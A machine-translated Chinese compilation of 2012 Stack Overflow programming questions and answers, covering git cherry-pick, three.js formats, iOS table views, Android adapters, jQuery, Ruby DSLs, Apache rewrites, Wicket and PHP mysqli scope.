*   [http://api.jquery.com/on/](http://api.jquery.com/on/)

# git - 谁能解释一下 git cherry-pick 做？

> ID：11243683
> 
> 赞同：5
> 
> 时间：2012-06-28T11:32:51.997
> 
> 标签：git, git-cherry-pick

我担心的是，我在另一个本地分支中有旧的提交 [包含 abc.cpp，def.cpp]。

现在几个月后我想使用这些更改，但是在我当前的分支中 abc.cpp 已升级。那么，如果我选择樱桃，它会将旧 abc.cpp 的更改整合到新的 abc.cpp [最近的工作目录副本] 中吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-28T12:21:48.193

git-cherry-pick(1) 手册页说：

> 给定一个或多个现有提交，应用每个引入的更改，并为每个提交记录一个新的提交。这要求您的工作树是干净的（不修改 HEAD 提交）。

用简单的英语来说，这意味着`git cherry-pick`将提交从一个分支应用到另一个分支，但不会像适当的合并那样保留来自另一个分支的原始历史或祖先。

将其视为应用一系列选定的补丁，而不是两个历史分支的完全合并。显然，如果您倾向于进行非常小的原子提交，那么挑选樱桃看起来就像应用一个编写良好的补丁。但是，由于您没有像合并或变基那样的共同祖先，因此如果您的提交不是小而孤立的，您可能需要解决更多的冲突。

挑选樱桃是否是一个好主意在很大程度上取决于您如何构建提交。如果它不适合你，你总是可以用`git format-patch`and来做更多的手动操作`git apply`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-28T11:36:25.937

是的，它就是这样做的。`cherry-pick`正在将提交（或其中的一个范围）作为补丁应用到您的分支（嗯，[几乎作为补丁](https://stackoverflow.com/questions/5156459/what-are-the-differences-between-git-cherry-pick-and-git-show-patch-p1)）。

由于分支上发生了独立修改，因此您可能会遇到冲突（例如合并分支时）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-09-23T07:43:49.353

请注意，使用[git1.8.5/1.9 (Q4 2013)](https://github.com/git/git/blob/128a96c98442524c7f2eeef4757b1e48445f24ce/Documentation/RelNotes/1.8.5.txt#L92-L95)， git cherry-pick 现在可以轻松地从“上一个分支”中挑选：

> 就像“ `git checkout -`”知道签出和“ `git merge -`”知道合并您之前所在的分支一样，“ `git cherry-pick`”现在理解“ `git cherry-pick -`”从前一个分支中选择。

请参阅[Hiroshige Umino (yaotti)](https://github.com/yaotti)的[提交 182d7d](https://github.com/git/git/commit/182d7dc46b23b4a20985c93ea3a6ba3e6f267ff6)：

### `cherry-pick`: 允许" `-`"作为' `@{-1}`'的缩写

> " `-`" 缩写对于 " `cherry-pick`" like "`checkout`和 " `merge`" 很方便。
> 
> **`-`一个 " " 代表上一个分支的名称，其中一个分支名称被接受，它不能表示任何其他东西，如 stdin ，这也有利于统一**。

# .net - 自定义咆哮 SDK 订阅者提要通知创建错误

> ID：11243686
> 
> 赞同：0
> 
> 时间：2012-06-28T11:33:04.783
> 
> 标签：.net, feed, growlnotify, growl-for-windows

使用 Windows 的咆哮。

我正在尝试实现一个自定义提要订阅插件，类似于 RSS/Atom 提要订阅者。一直在搜索论坛，但似乎找不到任何有用的信息。

我已经下载了 Growl 订阅者 SDK，并在 .NET，VS 2010 中实现了一个解决方案。我让插件“安装”/咆哮来拾取插件，但对于输入什么作为“提要 url”感到很困惑。

所以我想我的问题是“如何创建客户可以订阅的自己的订阅源”？

例如，在使用自定义转发器 SDK 实现了自定义转发器应用程序后，我尝试输入如下内容：`$http://localhost:2751/Home`作为 URL，但收到错误“无法解析提要”。

这对于任何其他尝试使用 windows 的咆哮来实现自定义订阅者的人都应该有帮助

非常感谢任何帮助！

编辑：检查了谷歌论坛，“为 Windows 咆哮”。SDK 下载自：[Growl for windows](http://www.growlforwindows.com/gfw/developers.aspx)

编辑2：似乎有点误解了这个问题。发送通知、接收通知和订阅提要之间似乎存在差异。提要需要是 RSS 提要，需要创建：/

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T19:08:06.617

请参阅我在 Growl for Windows 讨论组中的回复 - 我认为对各个部分的用途存在一些误解。[https://groups.google.com/group/growl-for-windows/browse_thread/thread/ed330b8e15a91b83?hl=en](https://groups.google.com/group/growl-for-windows/browse_thread/thread/ed330b8e15a91b83?hl=en)

# 3d - THREE.JS 的首选 3d 模型格式

> ID：11243689
> 
> 赞同：50
> 
> 时间：2012-06-28T11:33:07.623
> 
> 标签：3d, file-format, three.js

3d建模软件广泛使用的THREE.JS首选3d模型格式是什么（可以导出为该格式）。我问这个，因为我有自己独特格式的 3d 模型，并且想在 THREE.JS 中使用它们。虽然我可以编写自己的加载器，但我认为最好将它们转换为标准格式。

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2012-06-28T13:04:02.007

我们有自己的[JSON 几何格式](https://github.com/mrdoob/three.js/wiki/JSON-Geometry-format-4)。

你可以使用这些：

*   [编辑器](http://threejs.org/editor/)（将您的对象拖到窗口中，选择它并选择`File/Export Geometry`）
*   [搅拌机出口商](https://github.com/mrdoob/three.js/tree/master/utils/exporters/blender)
*   [从 OBJ 到 JSON 的 Python 脚本](https://github.com/mrdoob/three.js/blob/master/utils/converters/obj/convert_obj_three.py)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-01-01T02:46:47.827

在线 3D 编辑器[http://Clara.io](http://Clara.io)也可以导出为各种 ThreeJS JSON 格式。 [http://Clara.io](http://Clara.io)支持导入 FBX、Collada、3DS、STL 和 DXF 等 20 多种不同格式，因此可以作为通用转换工具使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T12:46:56.650

我认为three.js 没有首选的3d 模型。就我个人而言，我更喜欢波前对象（obj）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-12-06T10:21:12.033

从 clara.io 或其他提供商导出模型，然后导入[https://threejs.org/editor/](https://threejs.org/editor/) ，这样您就可以尝试某种格式的模型

# ios5 - 未在搜索结果表上触发的委托方法

> ID：11243690
> 
> 赞同：0
> 
> 时间：2012-06-28T11:33:17.777
> 
> 标签：ios5, uitableview, uisearchdisplaycontroller, uisearchbardelegate

全部，

我有一个带有详细信息的 UITableView，带有一个从代码创建的搜索栏。在选定的项目上工作正常，但在从搜索结果中单击项目时不起作用；没有委托方法触发。以前从未见过这种行为，所以我不知道问题出在哪里。

我对标准表格单元格和自定义表格单元格有相同的行为。

感谢您对此的任何指导并感谢。

**就挂在这里** ![在此处输入图像描述](../Images/09f2496133982ee43cfbede6b7691554.png)

```
//ViewController.h
 @interface SongsViewController : UITableViewController <UISearchBarDelegate,UISearchDisplayDelegate>
{
   NSMutableArray *searchData;
   UISearchBar *searchBar;
   UISearchDisplayController *searchDisplayController;
   UITableViewCell *customSongCell;
 }

 //ViewController.m
 -(void)viewDidLoad
 {
    [super viewDidLoad];

    CGRect screenRect = [[UIScreen mainScreen] bounds];
    CGFloat screenWidth = screenRect.size.width;

    searchBar = [[UISearchBar alloc] initWithFrame:CGRectMake(0, 0, screenWidth, 88)];

   [searchBar setShowsScopeBar:YES];
   [searchBar setScopeButtonTitles:[[NSArray alloc] initWithObjects:@"Title",@"Style", nil]];

   searchDisplayController = [[UISearchDisplayController alloc] initWithSearchBar:searchBar contentsController:self];
   searchDisplayController.delegate = self;
   searchDisplayController.searchResultsDataSource = self;
   self.tableView.tableHeaderView = searchBar; 

   //Load custom table cell
    UINib *songCellNib = [UINib nibWithNibName:@"SongItem" bundle:nil];

  //Register this nib, which contains the cell
  [[self tableView] registerNib:songCellNib forCellReuseIdentifier:@"SongItemCell"];

  // create a filtered list that will contain products for the search results table.
  SongStore *ps = [SongStore defaultStore];
  NSArray *songObjects = [ps allSongs];

  self.filteredListContent = [NSMutableArray arrayWithCapacity: [songObjects count]];
  self.masterSongArr = [[NSMutableArray alloc] initWithArray:[ps allSongs]];

 [self refreshData];

 [self.tableView reloadData];
 self.tableView.scrollEnabled = YES;

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T20:52:45.790

我解决了这个问题。我忘了设置这个 searchDisplayController 代表：

`[searchDisplayController setSearchResultsDelegate:self];`

因此，请确保您设置了**所有**这些：

```
searchDisplayController = [[UISearchDisplayController alloc] initWithSearchBar:searchBar contentsController:self];
[searchDisplayController setDelegate:self];
[searchDisplayController setSearchResultsDataSource:self];
[searchDisplayController setSearchResultsDelegate:self]; 
```

# android - 使用 CustomAdapter android 从 ListView 中获取对象

> ID：11243692
> 
> 赞同：0
> 
> 时间：2012-06-28T11:33:33.160
> 
> 标签：android

我有一个这样的自定义适配器：

```
public class DeviceAdapter extends BaseAdapter {

private static ArrayList<Device> availableDevices;
Context c;
private LayoutInflater mInflater;

/**
 * Constructor for this class
 * @param context Which context triggered this class
 * @param devices Object of each devices
 */
public DeviceAdapter(Context context, ArrayList<Device> devices) {
    this.availableDevices = devices; 
    this.c = context; 
    mInflater = LayoutInflater.from(c);
}

public int getCount() {
    return availableDevices.size();
}

public Object getItem(int position) {
    return availableDevices.get(position);
}

public long getItemId(int position) {
    return position;
}

public View getView(int position, View convertView, ViewGroup parent) {
    ViewHolder holder;
    if (convertView == null) {
        convertView = mInflater.inflate(R.layout.device_list, null);
        holder = new ViewHolder();
        holder.name = (TextView) convertView.findViewById(R.id.name);
        holder.address = (TextView) convertView.findViewById(R.id.address);

        convertView.setTag(holder);
    } else {
        holder = (ViewHolder) convertView.getTag();
    }

    holder.name.setText("Device name: "+availableDevices.get(position).getName());
    holder.address.setText("Mac-address: "+ availableDevices.get(position).getAddress());

    return convertView;
}

static class ViewHolder {
    TextView name;
    TextView address;

} 
```

}

我的问题是：如何访问`name`用户按下的对象变量？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:36:51.817

使用 onItemClickListener 和列表[http://developer.android.com/reference/android/widget/AdapterView.OnItemClickListener.html](http://developer.android.com/reference/android/widget/AdapterView.OnItemClickListener.html)

```
ist.setOnItemClickListener(new AdapterView.onItemClickListener() {
   @Override
   public void onItemClick(AdapterView<?> adapter, View view, int position, long arg) {
      Object listItem = list.getItemAtPosition(position);

     or
     TextView tv =    (TextView) view.findViewById(R.id.name);
         name = tv.getText(); 

   } 
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:46:20.897

您可以通过添加 holder.name.setOnClickListener 来获取仅名称 TextView 单击的 OnClick 事件......请参见以下代码

```
public class DeviceAdapter extends BaseAdapter {

private static ArrayList<Device> availableDevices;
Context c;
private LayoutInflater mInflater;

/**
 * Constructor for this class
 * @param context Which context triggered this class
 * @param devices Object of each devices
 */
public DeviceAdapter(Context context, ArrayList<Device> devices) {
    this.availableDevices = devices; 
    this.c = context; 
    mInflater = LayoutInflater.from(c);
}

public int getCount() {
    return availableDevices.size();
}

public Object getItem(int position) {
    return availableDevices.get(position);
}

public long getItemId(int position) {
    return position;
}

public View getView(int position, View convertView, ViewGroup parent) {
    ViewHolder holder;
    if (convertView == null) {
        convertView = mInflater.inflate(R.layout.device_list, null);
        holder = new ViewHolder();
        holder.name = (TextView) convertView.findViewById(R.id.name);
        holder.address = (TextView) convertView.findViewById(R.id.address);

        convertView.setTag(holder);
    } else {
        holder = (ViewHolder) convertView.getTag();
    }

    holder.name.setText("Device name: "+availableDevices.get(position).getName());
    holder.address.setText("Mac-address: "+ availableDevices.get(position).getAddress());

    //   PUT FOLLOWIN   ------------------
    holder.name.setOnClickListener(new OnClickListener() {
                public void onClick(View v) {
                    put your dezired code here which runs OnClick of TextView NAME
                }
            });
    //         -----------------

    return convertView;
}

static class ViewHolder {
    TextView name;
    TextView address;

}

} 
```

# jquery - 从 td 中找到 td 文本单击同一个 tr

> ID：11243698
> 
> 赞同：3
> 
> 时间：2012-06-28T11:33:43.020
> 
> 标签：jquery

为什么这不起作用`$(this).parents("tr").find("td:eq(2)").html()`

我无法缝合以获取`getthis`相对于`td` `tr`调用它的文本“”

```
<table>

    <tr>
        <td>1</td>
        <td>getthis</td>
        <td onclick="$(this).parents("tr").find("td:eq(2)").html()">4</td>
        <td>5</td>
    </tr>

    <tr>
        <td>1</td>
        <td>getthis</td>
        <td onclick="$(this).parents("tr").find("td:eq(2)").html()">4</td>
        <td>5</td>
    </tr>

        <tr>
        <td>1</td>
        <td>getthis</td>
        <td onclick="$(this).parents("tr").find("td:eq(2)").html()">4</td>
        <td>5</td>
    </tr>

    <tr>
        <td>1</td>
        <td>getthis</td>
        <td onclick="$(this).parents("tr").find("td:eq(2)").html()">4</td>
        <td>5</td>
    </tr>   

</table> 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-28T11:39:51.640

您使用双引号太多了。在行中创建字符串时，您会意外地结束该`onclick`属性。此外，`eq`它是零索引的，所以你想要`1`。

更好（但只是因为它有效）：

```
<td onclick="$(this).parents('tr').find('td:eq(1)').html()">4</td> 
```

最好的：

```
$("table").on("click", "td:nth-child(2)", function(e) {
    $(this).prev().html();  //Get the previous sibling's HTML without inline JS
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:37:33.200

您应该用块中的一小段代码替换重复的内联事件处理程序（容易出错且过时）`<script>`：

这使用在整个表上注册的单个“委托”处理程序，但只监听第三列的点击：

```
$('table').on('click', 'td:nth-child(3)', function() {
    alert($(this).prev().html());
}); 
```

[这段代码当然应该出现在`$(document).ready()`处理程序中，以确保它在加载 DOM 之后才会运行]。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-28T11:37:38.040

您的实际问题是您使用双引号来分隔您的 onclick，但也在 jQuery 中。它应该是：

```
 onclick="$(this).parents('tr').find('td:eq(1)').html()" 
```

但更好的是：只需使用`prev()` [JQuery Doc](http://api.jquery.com/prev/)

```
$(this).parents("tr").find("td:eq(2)").html() 
```

会成为

```
$(this).prev().html(); 
```

将这些点击处理程序放在一个单独的函数中（尽管有可能，但您可能希望使用一个类（例如`click`）来处理相应的 td）：

```
$('table').on('click', 'td.click', function() {
    alert($(this).prev().html());
}); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-28T11:38:03.377

```
<table>
    <tr>
        <td>1</td>
        <td>getthis</td>
        <td class="clickMe">4</td>
        <td>5</td>
    </tr>
</table>

<script>
$(".clickMe").click(function() {
    alert(this.parentNode.children[1].innerText);
});
</script> 
```

这是一个工作示例：http: [//jsfiddle.net/sme7c/1](http://jsfiddle.net/sme7c/1)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-28T11:35:01.693

尝试`closest`代替`parents`

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-28T11:41:33.407

您的代码存在许多问题。

1.  您在 jQuery 代码中使用了双引号，但没有对它们进行转义，因此您过早地结束了该属性，并生成了无效的 HTML。

2.  jQuery 代码只是简单地返回一个字符串，但不使用它**做**任何事情，所以你不应该期望看到任何东西。

3.  您的元素索引可能是错误的；元素从 0 开始索引，而不是 1，因此`:eq(2)`返回第三个元素，而不是第二个。或者，换一种说法，您的代码会找到已单击的完全相同的元素。

# ruby - 在 Ruby 内部 DSL 中重构为无块参数

> ID：11243700
> 
> 赞同：0
> 
> 时间：2012-06-28T11:33:45.190
> 
> 标签：ruby, codeblocks, dsl, yield

我有一个看起来像这样的小 DSL：

```
ActivityLogger.log do
  activity('27-06-2012') do
    eat do |act|
     act.duration = 15
     act.priority = 5
    end
  end
end 
```

我想重构它，使它丢失最里面的块中的块参数，所以它看起来像这样：

```
ActivityLogger.log do
  activity('27-06-2012') do
    eat do
     duration = 15
     priority = 5
    end
  end
end 
```

该`#eat`方法实例化一个 Log 对象：

```
def eat(&block)
  @logs << Log.new(Eat, &block)
end 
```

Log 的构造函数`self`在最后一行产生：

```
def initialize(activity, &block)
  @activity = activity
  yield self
end 
```

在我看来，这就是问题所在。我已经尝试过`instance_eval`在`#eat`方法中使用（参见下面的链接#2）和`yield`完全从日志的构造函数中删除语句（链接#3），但是这些方法都不起作用（创建了日志对象，但没有得到它`#duration`和`#priority`方法集）。

以下是链接：

1)[具有块参数的工作 DSL](https://gist.github.com/3010757)

2）[非工作DSL，第一次重构尝试](https://gist.github.com/3010768)

3）[非工作DSL，第二次重构尝试](https://gist.github.com/3010784)

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T12:09:32.753

`duration = 15`没有像您期望的那样调用 setter 方法，而是定义了一个局部变量`duration`。您必须通过显式调用 setter`self.duration = 15`或实现您的 setter

```
def duration(value)
  @duration = value
end 
```

并打电话`duration 15`。

# php - Apache/Mod 重写：将所有内容路由到 index.php？

> ID：11243709
> 
> 赞同：2
> 
> 时间：2012-06-28T11:34:24.923
> 
> 标签：php, apache, .htaccess, mod-rewrite

我正在编写一个前端控制器，它将通过解析处理页面请求

```
$_SERVER['REQUEST_URI']. 
```

我想让所有请求路由到 /index.php

一些例子如下：

```
example.com/page2?foo=bar
example.com/page2/?foo=bar
example.com/page/action/123/
example.com/page/action/123 
```

我必须在 .htaccess 中编写的正则表达式规则是什么？

我是否需要一个额外的规则，以便 example.com/images/ 目录可以作为“正常”目录工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:37:25.763

你可以尝试这样的事情：

```
RewriteCond %{REQUEST_URI} !^/dir_under_rootdocument/index\.php
RewriteCond %{REQUEST_URI} !\.(gif|jpg|png|js|css)$
RewriteRule (.*) dir_under_rootdocument/index.php/$1 [L,QSA] 
```

# ios - 键盘出现时UITableViewController不滚动视图

> ID：11243712
> 
> 赞同：15
> 
> 时间：2012-06-28T11:34:36.483
> 
> 标签：ios, uitableview, cocoa-touch, uitextfield

我有一个`UITableViewController`大约 20 个静态单元格，其中一些单元格中有`UITextField`s，而有些只是用于选择带有复选标记。该表的价值约为 1.5 个视图，因此需要滚动才能到达较低的文本字段。

当我在表格底部的文本字段中单击时，键盘会按原样弹出，但随后会出现在单元格/文本字段上。

我的印象（来自Apple docs和其他地方）`UITableViewController`当键盘以任何方向出现并向上移动表格视图以使单元格可见时，该类会自动处理视图的滚动，但这并没有发生。

IOS 5.1，iPad 肖像。

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2012-06-28T11:42:50.677

确保如果你覆盖`viewWillAppear`你调用

```
[super viewWillAppear:animated]; 
```

否则，滚动视图将无法正确向上滚动。

**迅速**

```
super.viewWillAppear(animated) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-02-09T01:49:05.370

我发现这些答案都不正确。过了一会儿，我注意到如果你按下一个控制器，它不会工作......但如果你以模态方式呈现它......表格将自动滚动到使用的文本字段。

希望这可以节省任何人的时间和压力。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-05-18T17:13:40.627

> 如果 UITableViewController 的自动滚动不适用于单元格中的 UITextField 或滚动异常，请执行以下步骤。**Swift 5 iOS 13.2 测试 100%**

首先实现**viewWillAppear**但不要调用**super.viewWillAppear**（这将**停止**自动滚动）

```
override func viewWillAppear(_ animated: Bool) {

} 
```

**然后让我们手动**进行滚动。

```
override func viewWillAppear(_ animated: Bool) {

  //Notification center observers
  NotificationCenter.default.addObserver(self, selector: #selector(keyboardWillShow(notification:)),
                                             name: UIResponder.keyboardDidShowNotification, object: nil)
  NotificationCenter.default.addObserver(self, selector: #selector(keyboardWillHide(notification:)),
                                            name: UIResponder.keyboardWillHideNotification, object: nil)

}

//keybord show action
@objc func keyboardWillShow(notification: Notification) {
    tableView.contentInset = UIEdgeInsets(top: 0, left: 0, bottom: notification.getKeyBoardHeight, right: 0)
}
//keyboard hide action
@objc func keyboardWillHide(notification: Notification) {
    tableView.contentInset = UIEdgeInsets(top: 0, left: 0, bottom: 0, right: 0)
}

extension Notification {

    var getKeyBoardHeight: CGFloat {

        let userInfo: NSDictionary = self.userInfo! as NSDictionary
        let keyboardFrame: NSValue = userInfo.value(forKey: UIResponder.keyboardFrameEndUserInfoKey) as! NSValue
        let keyboardRectangle = keyboardFrame.cgRectValue
        return keyboardRectangle.height
    }

}

override func viewWillDisappear(_ animated: Bool) {
   super.viewWillDisappear(animated)
   NotificationCenter.default.removeObserver(self)
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-02-24T22:55:59.247

我自己遇到了这个问题。我刚刚将我的视图控制器从 UIViewController 转换为 UITableViewController 除了添加`[super viewWillAppear:animated];`调用之外，您还需要删除这些行：

`[self.tableView setDataSource:self]; [self.tableView setDelegate:self];`

因为它们不再需要并且 setDelegate 会干扰键盘滚动行为。

# wicket - 为扩展基本页面的页面呈现两次检票头标记

> ID：11243714
> 
> 赞同：1
> 
> 时间：2012-06-28T11:34:40.710
> 
> 标签：wicket, wicket-1.5, page-layout

我正在将我们现有的 Web 应用程序从 Wicket 1.4 移植到 1.5。在应用程序中有两个模板页面，它们是基本页面的子页面。这些模板被命名为安全和不安全，它们为经过身份验证和未经身份验证的用户定义页面。应用程序中的任何页面都继承自这些模板。在 Wicket 1.4 中，此设置运行良好，没有任何问题。

移植到 Wicket 1.5 后，我收到以下错误：

> 在 [HtmlHeaderContainer] 中找不到 ID 为“PageTitle”的组件

'PageTitle' 是一个 Wicket 标签，用于在基本页面中动态构建页面标题，它位于`<head>`基本页面标记的标记中。我发现`<head>`标记被渲染了两次，所以我认为我得到了错误，因为 Wicket 创建了一次 PageTitle 然后尝试再次创建它（`<head>`仅在基页标记中定义）。

快速而肮脏的解决方法是将 PageTitle 移动到模板（重复代码）。有没有更好的方法来解决这个问题？

希望我的描述足够清楚，但是，如果需要，我可以提供代码示例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T09:36:58.940

好的，按照要求这里是一个代码示例。BasePage.java：

```
public class BasePage extends WebPage 
{

  public BasePage() 
  {
     this(new PageParameters());
  }

  public BasePage(PageParameters parameters)
  { 
    add(new Label("PageTitle", "Gosh Wicket version migration is hard work"));
  }
  ... 
```

}

BasePage.html（doctype 等，已删除）：

```
<html>  
<head>
    <meta http-equiv="content-type" content="text/html;charset=iso-8859-1" />
    <title wicket:id="PageTitle">Page title goes here</title>
    <!-- This comment will appears in both the headers I see in the source, therefore this header is rendering twice-->
    <link type="text/css" rel="stylesheet" href="css/application.css" />
    <script type="text/javascript" src="js/rollover.js"></script>
    <script type="text/javascript" src="js/menus.js"></script>
</head>

<wicket:child/>
</html> 
```

UnSecureTemplate java:

```
public class UnSecureTemplate extends BasePage
{
  public UnSecurePageTemplate()
  {
      super(new PageParameters());
  }

  public UnSecureTemplate(PageParameters parameters) 
  {
    super(parameters);

    Label footerText = new Label("footerText", footerComesFromAPropertiesFile); 
    add(footerText);

    //Instance variables here defined in BasePage       
    // Header bar links - left
    Link<Object> hdrHome = addLink("hdrHome", HomePage.class);//this method is in BasePage in case you're wondering
    hdrHome.add(new Image("mgrLogo", new ContextRelativeResource(poLogoUrl)));

    // Header bar links - Right
    ExternalLink hdrCorporate = new ExternalLink("hdrCorporate", anExternnalLink);
    hdrCorporate.add(new Image("operatorLogo", new ContextRelativeResource(opLogoUrl)));
    add(hdrCorporate);
  } 
```

UnSecureTemplate.html：

```
<wicket:extend xmlns="http://www.w3.org/1999/xhtml" lang="en"
xmlns:wicket="http://wicket.apache.org/dtds.data/wicket-xhtml1.4-strict.dtd">

<body id="body" onload="preloadImages(); return true;">

<div class="centerbody">
    <a name="top"></a>
    <div id="mast">
        <a wicket:id="hdrHome" title="home page">
            <img wicket:id="mgrLogo" id="mgr-logo" src="images/logoShort.png" width="171" height="45" wicket:message="alt:remon.logoAltText" /> 
        </a>
        <a wicket:id="hdrCorporate" title="Web Site">
            <img wicket:id="operatorLogo" id="po-logo" src="images/logoNoStrapline.png" height="45" wicket:message="alt:remon.logoAltText" />
        </a>
    </div>

    <div id="mainmenubar" style="width: 100%">
        <div class="menubaritem" style="width: 171px;">
            <a href="#">&nbsp;</a>
        </div>
        <div class="menubaritem" style="width: auto; border-right: none;">
            <a href="#">&nbsp;</a>
        </div>
    </div>

    <div id="mainpanel">
        <div id="leftnav">
            <p>&nbsp;</p>
        </div>

        <div id="rightpanel">

            <wicket:child/>

        </div> <!-- right panel -->
    </div> <!-- main panel -->

    <div id="footer" style="height:15px;">
        <span><a href="#top" style="text-decoration: none;" title="Back to Top"><span wicket:id="footerText">Footer Text</span></a></span>
    </div>
    <div id="footerspacer">
        &nbsp;
    </div>
</div> <!-- centre body -->

</body>
</wicket:extend>

} 
```

一个应用程序页面，LogIn.java：

```
public class Login extends UnSecureTemplate 
{

  public Login()  
  {
      this(new PageParameters());
  }

  public Login(PageParameters pageParameters) 
  {
    super(pageParameters);

    String welcomeResourceString = stringObtainedFromPropertiesFile;

    add(new Label("welcome", welcomeResourceString));
    add(new Label("loginHeader", thisAlsoComesFromPropertiesFile);

    LoginForm form = new LoginForm("loginform", new SimpleUser(), pageParameters);
    form.add(new FeedbackPanel("feedback"));
    add(form);
}

... 
```

}

登录.html：

```
<wicket:extend xmlns="http://www.w3.org/1999/xhtml" lang="en"
xmlns:wicket="http://wicket.apache.org/dtds.data/wicket-xhtml1.4-strict.dtd">

<h2 wicket:id="welcome">Welcome to the Application</h2>

<div style="margin: 20px 150px 20px 150px; text-align: center;">
    <p wicket:id="loginHeader"></p>
    <form wicket:id="loginform" id="loginform" >
        <table style="display: table; border: 0px; margin: auto;" wicket:message="summary:loginTableSummary">
            <tr style="display: table-row;">
                <td class="login" colspan="2"><span wicket:id="feedback">Feedback</span></td>
            </tr>
            <tr style="display: table-row;">
                <td class="login">
                    <label for="username"><wicket:message key="username">Username</wicket:message></label>
                </td>
                <td class="login">
                    <input wicket:id="username" id="username" type="text" name="user" value="" size="30" maxlength="50"/>
                </td>
            </tr>
            <tr style="display: table-row;">
                <td class="login">
                    <label for="password"><wicket:message key="password">Password</wicket:message></label>
                </td>
                <td class="login">
                    <input wicket:id="password" id="password" type="password" name="pswd" value="" size="30" maxlength="16"/>
                </td>
            </tr>
            <tr style="display: table-row;">
                <td class="login">&nbsp;</td>
                <td class="login"><input class="btn" type="submit" name="Login" value="Login" wicket:message="title:loginButtonTitle"/></td>
            </tr>
        </table>
    </form>
</div>
 </wicket:extend> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T12:03:41.990

<head> 标签只能在页面标记中使用一次。这意味着如果您在基本页面中有 <head> 标记，则扩展它的任何页面都不应包含它。此外，任何组件都不应使用 <head> 标记。

相反，请使用 <wicket:head> 标记来包含未包含在基本页面中的任何其他内容。Wicket 将使用 <wicket:head> 标记将内容动态注入到呈现并传递给浏览器的 <head> 标记中。

# mysql - 将远程mysql数据库连接到本地mysql数据库？

> ID：11243715
> 
> 赞同：1
> 
> 时间：2012-06-28T11:22:13.340
> 
> 标签：mysql, database, drupal, drupal-7

我想编写一个嵌入到 drupal7 模块中的 php 代码。

我想调用一个可以将本地mysql数据库中新生成的数据复制到远程mysql数据库的程序。

当数据插入到我的本地数据库的表“A”中时，它应该被复制到远程 mysql 服务器数据库的特定表“B”中。

表“A”在本地主机上。

表“B”在远程服务器上。

在“A”上插入数据->在“B”中复制数据

这可能吗？

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:36:42.153

触发器 +`Federated tables`应该可以解决问题：http:
[//dev.mysql.com/doc/refman/5.0/en/federated-use.html](http://dev.mysql.com/doc/refman/5.0/en/federated-use.html)
[http://dev.mysql.com/doc/refman/5.0/en/federated-限制.html](http://dev.mysql.com/doc/refman/5.0/en/federated-limitations.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:38:08.383

如果您正在寻找自动备份或主->从复制，有一些方法可以在不触及任何代码的情况下完成。

请参阅此处了解如何： [http ://dev.mysql.com/doc/refman/5.0/en/replication-howto.html](http://dev.mysql.com/doc/refman/5.0/en/replication-howto.html)

这是我个人最喜欢的： [http ://blog.evandavey.com/2008/05/how-to-setup-mysql-replication-a-simple-guide.html](http://blog.evandavey.com/2008/05/how-to-setup-mysql-replication-a-simple-guide.html)

相关帖子： [phpmyadmin 同步](https://stackoverflow.com/questions/5115374/phpmyadmin-synchronize)

仍然需要帮助吗？邮政。

# php - 如果我的 $mysqli 对象被声明在范围之外，我该如何在我的类中使用它？

> ID：11243721
> 
> 赞同：0
> 
> 时间：2012-06-28T11:35:10.617
> 
> 标签：php, oop, class, scope, mysqli

我刚开始做OOP，所以如果有一个简单的解决方案，我提前道歉。基本上我需要在一个*类中使用我的***$mysqli**对象。我把它分成了两个文件。

 ***config2.php**

```
class Config
{

    public $host = 'localhost';
    public $username = '****';
    public $password = '****';
    public $database = '****';

    function report_error($query)
    {
        $email = '*@hotmail.com';
        $subject = 'MySQL error.';
        $message = "IP: {$_SERVER['REMOTE_ADDR']} \n URL: http://{$_SERVER['SERVER_NAME']}{$_SERVER['REQUEST_URI']} \n\n MySQL query: {$query} \n\n MySQL error: " . $mysqli->error();

        mail($email, $subject, $message);
        die('Oops, an error has occured. The administrator has been notified.');
    }

}

$config = new Config();
$mysqli = new mysqli($config->host, $config->username, $config->password, $config->database);

if($mysqli->connect_error)
    report_error($mysqli); 
```

**管理.php**

```
require('includes/config2.php');

$mysqli->real_escape_string();   // Works out of scope.

class Account
{
    public $username = $mysqli->real_escape_string();   // Doesn't work in scope.
    public $password;

    function login()
    {

    }
} 
```

感谢您的帮助，我很感激:)。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:38:59.677

您应该将对象传递给构造函数`Account`并将其保存为私有实例变量。

`Account`直接依赖于 的实例`mysqli`，因此通过在构造函数中将其指定为必需参数来明确这一点并没有错。这是您可以确保无论何时`Account`使用 mysqli 对象的唯一方法。如果您从全局状态访问它（通过使用静态访问器或直接访问全局范围），您永远无法保证它确实存在。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:37:56.357

您应该封装 $mysqli 对象并将其设为[静态](http://php.net/manual/de/language.oop5.static.php)

